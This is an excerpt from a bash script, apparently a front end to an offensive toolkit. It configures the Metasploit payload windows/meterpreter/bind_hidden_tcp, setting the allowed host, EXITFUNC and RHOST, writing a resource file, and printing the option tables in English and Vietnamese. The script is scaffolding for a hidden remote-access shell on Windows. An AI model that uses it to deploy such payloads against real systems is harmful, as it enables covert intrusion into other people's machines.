...
ahost_lenght=`echo "$ahost" | awk '{print length}'`
	if  [ "$ahost_lenght" -le 18 ]; then
		payload1
	else
		payload2
	fi
...
function set_payload {
		if [[ "$new_processing_variables" = "ahost" ]] || [[ "$new_processing_variables" = "AHOST" ]] || [[ "$new_processing_variables" = "Ahost" ]]; then
			unset ahost
			ahost="$module_set"
...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/bind_hidden_tcp):
   ...
   AHOST          $ahost$yes    Địa chỉ IP được cho phép.
...
no="     no "
cat << !
Payload options (windows/meterpreter/bind_hidden_tcp):

   Name           Current Setting       Required  Description
   ----           ---------------       --------  -----------
   EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
   AHOST          $ahost$yes      IP address allowed
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/bind_hidden_tcp" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set AHOST $ahost" >> $rc_file
	echo "set RHOST $rhost" >> $rc_file
	paylo="windows/meterpreter/bind_hidden_tcp"
	ahost=$ahost
	lport=$lport
}
